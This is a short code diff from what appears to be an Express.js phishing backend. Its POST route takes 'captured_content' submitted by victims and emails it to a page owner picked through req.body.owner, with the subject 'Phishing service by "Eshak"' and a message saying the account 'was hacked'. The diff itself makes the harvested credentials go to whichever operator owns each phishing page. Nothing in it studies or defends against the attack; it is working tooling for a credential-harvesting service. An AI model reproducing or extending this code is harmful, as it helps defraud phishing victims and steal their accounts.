@@ -41,7 +41,7 @@ app.post('/_', function (req, res) {
     console.log("es"+toMail);
     var message = "If the input value has correct then id was hacked "+captured_content;
   
-    let toEmail = myArray.find(o => o.id === 1);
+    let toEmail = myArray.find(o => o.id === req.body.owner);
 
    console.log(toEmail.email);
   
@@ -60,7 +60,7 @@ app.post('/_', function (req, res) {
   subject: 'Phishing service by "Eshak"', // Subject line
   text: message //plain text body
 };
-
+if(req.body.owner){
 transporter.sendMail(mailOptions, function (err, info) {
   if (err)
     console.log(err)
@@ -69,7 +69,7 @@ transporter.sendMail(mailOptions, function (err, info) {
     
     res.render('f_success');
 });
-    
+    }
     console.log(67);
     
  //   res.render('f_success');
